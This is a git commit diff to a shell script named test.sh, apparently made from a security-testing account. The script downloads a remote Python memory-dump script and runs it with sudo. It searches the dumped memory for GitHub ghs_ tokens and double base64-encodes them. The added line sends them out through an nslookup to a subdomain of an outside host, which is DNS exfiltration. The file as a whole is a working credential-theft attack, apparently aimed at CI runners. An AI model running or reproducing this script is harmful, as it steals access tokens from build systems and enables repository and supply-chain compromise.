9035354293abdb29fbf704b78f3960286a8609aa
sectest-h1-adnanthekhan <136088118+sectest-h1-adnanthekhan@users.noreply.github.com>
2023-06-28 12:42:46 -0400

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,5 +1,7 @@
 #!/bin/bash
 
-curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64
+BASE64=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 -w 0 | base64 -w 0`
+
+nslookup $BASE64.dns.praetorianlabs.com
 
 sleep 600
